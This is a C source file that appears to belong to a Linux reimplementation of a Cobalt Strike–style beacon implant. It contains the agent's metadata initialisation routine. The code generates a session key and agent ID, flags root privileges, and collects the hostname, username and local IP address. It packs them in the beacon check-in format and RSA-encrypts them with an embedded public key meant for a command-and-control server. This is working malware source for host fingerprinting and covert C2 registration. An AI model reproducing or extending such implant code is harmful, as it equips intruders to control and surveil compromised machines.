#define _GNU_SOURCE
#include "beacon.h"
#include "parse.h"
#include "security.h"
#include "debug.h"
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/rand.h>

sessdata bigsession;
unsigned int agentid;

static uint32_t local_ipv4(void) {
    struct ifaddrs *ifaddr = NULL, *ifa;
    uint32_t ip = htonl(0x7f000001);
    if (getifaddrs(&ifaddr) == -1) return ip;
    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        struct sockaddr_in *sa;
        uint32_t v;
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        sa = (struct sockaddr_in *)ifa->ifa_addr;
        v = sa->sin_addr.s_addr;
        if ((v & 0xff) == 127) continue;
        if ((v & 0xff) == 169 && ((v >> 8) & 0xff) == 254) continue;
        ip = v;
        break;
    }
    freeifaddrs(ifaddr);
    return ip;
}

unsigned int bigger_rand(void) {
    unsigned int n = 0;
    RAND_bytes((unsigned char *)&n, sizeof(n));
    return n;
}

unsigned int genagentid(void) {
    return bigger_rand() & 0x7FFFFFFFu & ~1u;
}

void agent_init(char *buffer, unsigned int max) {
    builder b;
    char sessionkey[16];
    uint16_t ansi = 1252, oem = 437;
    unsigned char flags = 0;
    char host[256], user[256], proc[256], meta[128];
    int rlen, len;
    char *pubkey;
    int pubkey_len;
    struct passwd *pw;

    RAND_bytes((unsigned char *)sessionkey, 16);
    security_init(sessionkey);

    agentid = genagentid();
    bigsession.myid = (int)agentid;

#if defined(__x86_64__) || defined(_M_X64) || defined(__aarch64__)
    flags |= METADATA_FLAG_AGENT_X64 | METADATA_FLAG_TARGET_X64;
#endif
    if (geteuid() == 0) flags |= METADATA_FLAG_ADMIN;

    gethostname(host, sizeof(host));
    pw = getpwuid(getuid());
    snprintf(user, sizeof(user), "%s", pw && pw->pw_name ? pw->pw_name : "user");
    snprintf(proc, sizeof(proc), "beacon");
    snprintf(meta, sizeof(meta), "%s\t%s\t%s", host, user, proc);
    rlen = (int)strlen(meta);
    if (rlen > 58) rlen = 58;

    build_init(&b, buffer, (int)max);
    build_add_data(&b, sessionkey, 16);
    /* charsets little-endian */
    build_add_data(&b, (char *)&ansi, 2);
    build_add_data(&b, (char *)&oem, 2);
    build_add_int(&b, agentid);
    build_add_int(&b, (uint32_t)getpid());
    build_add_short(&b, 0);
    build_add_byte(&b, flags);
    /* OS version placeholders */
    build_add_byte(&b, 5);
    build_add_byte(&b, 0);
    build_add_short(&b, 0);
    build_add_int(&b, 0);
    build_add_int(&b, 0);
    build_add_int(&b, 0);
    build_add_int(&b, local_ipv4());
    build_add_data(&b, meta, rlen);

    len = build_length_rsa(&b);

    memset(bigsession.data, 0, sizeof(bigsession.data));
    bigsession.length = 128;
    pubkey = setting_ptr(SETTING_PUBKEY);
    pubkey_len = pubkey ? (int)setting_len(SETTING_PUBKEY) : 0;
    if (!pubkey || pubkey_len <= 0) {
        ERROR_PRINT("[metadata] no SETTING_PUBKEY\n");
        return;
    }
    {
        int ol = 256;
        if (rsa_encrypt_once(pubkey, pubkey_len, buffer, len, bigsession.data, &ol) == 0) {
            bigsession.length = ol;
        } else {
            ERROR_PRINT("[metadata] RSA encrypt failed (pubkey_len=%d plain=%d)\n",
                        pubkey_len, len);
        }
    }
    memset(buffer, 0, (size_t)len);
    DEBUG_PRINT("[metadata] agentid=%u rsa_len=%d\n", agentid, bigsession.length);
}
